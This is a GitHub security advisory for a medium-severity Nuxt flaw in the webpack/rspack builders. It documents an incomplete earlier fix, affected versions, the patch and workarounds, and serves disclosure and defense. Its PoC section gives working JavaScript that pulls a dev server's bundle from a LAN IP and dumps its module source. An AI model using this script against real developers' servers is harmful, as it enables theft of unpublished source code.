# [M] Nuxt: Dev server exposes built source over LAN to malicious sites (incomplete fix for GHSA-4gf7-ff8x-hq99)

## Summary
Severity: Medium
Advisory: GHSA-6m52-m754-pw2g
CVE: CVE-2026-45670
CWE: CWE-749
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-6m52-m754-pw2g
Type: github-advisory

## Affected
- npm: `@nuxt/rspack-builder` — affected >=3.15.4 <3.21.6
- npm: `@nuxt/rspack-builder` — affected >=4.0.0-alpha.1 <4.4.6
- npm: `@nuxt/webpack-builder` — affected >=3.15.4 <3.21.6
- npm: `@nuxt/webpack-builder` — affected >=4.0.0-alpha.1 <4.4.6

## Details
### Summary
This is an incomplete fix for [GHSA-4gf7-ff8x-hq99](https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99). Source code may be stolen during dev when using the webpack / rspack builder if the dev server is bound to a non-loopback address (e.g. `nuxt dev --host`) and the developer opens a malicious site on the same network.

### Details
The fix for [GHSA-4gf7-ff8x-hq99](https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99) relied on Sec-Fetch-Mode and Sec-Fetch-Site headers. Because [these headers are sent by the browsers only for potentially trustworthy origins](https://w3c.github.io/webappsec-fetch-metadata/#sec-fetch-site-header:~:text=Site%20header%20for%20a%20request%20r%3A-,Assert%3A%20r%E2%80%99s%20url%20is%20a%20potentially%20trustworthy%20URL.,-Let%20header%20be%20a%20Structured%20Field%20whose), the check is able to bypass for non-potentially trustworthy origins.

Since the attack requires the website to be accessible via a non-potentially trustworthy origin, only apps that are using `--host` is affected.

### PoC
1. Create a nuxt project with webpack / rspack builder.
1. Run `npm run dev`
1. Open `http://localhost:3000`
1. Run the script below in a web site that has a different origin.
1. You can see the source code output in the document and the devtools console.

```js
const script = document.createElement('script')
script.src = 'http://192.168.0.31:3000/_nuxt/app.js' // NOTE: replace with the IP address the dev server listens to
script.addEventListener('load', () => {
  const key = Object.keys(window).find(k => k.startsWith("webpackChunk"))
  for (const page in window[key]) {
    const moduleList = window[key][page][1]
    console.log(moduleList)

    for (const key in moduleList) {
      const p = document.createElement('p')
      const title = document.createElement('strong')
      title.textContent = key
      const code = document.createElement('code')
      code.textContent = moduleList[key].toString()
      p.append(title, ':', document.createElement('br'), code)
      document.body.appendChild(p)
    }
  }
})
document.head.appendChild(script)
```
(This script is the similar with [GHSA-4gf7-ff8x-hq99](https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99) except for the `script.src` and the global variable name)

### Impact
Users using webpack / rspack builder may get the source code stolen by malicious websites if it uses a predictable host and also is using `--host`.

This vulnerability does not affect Chrome 142+ (and other Chromium based browsers) users due to [the local network access restriction feature](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).

### Patches
Fixed in `nuxt@4.4.6` and `nuxt@3.21.6` by [#35051](https://github.com/nuxt/nuxt/pull/35051). The dev-middleware same-origin check now falls back to comparing the request's `Origin` / `Referer` host against `Host` when `Sec-Fetch-*` headers are absent, closing the non-trustworthy-origin bypass.

The fix only ships for the `@nuxt/webpack-builder` and `@nuxt/rspack-builder` packages. The default Vite builder was not affected.

### Workarounds
If you cannot upgrade immediately:

- Don't use `nuxt dev --host`. Bind the dev server to `localhost` (the default) and tunnel from other devices via SSH or a reverse proxy that enforces same-origin checks.
- Use Chrome 142+ or another Chromium-based browser that enforces [local network access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).
- Switch to the Vite builder for development.

## References
- https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99
- https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g
- https://nvd.nist.gov/vuln/detail/CVE-2026-45670
- https://github.com/nuxt/nuxt/pull/35051
- https://github.com/nuxt/nuxt
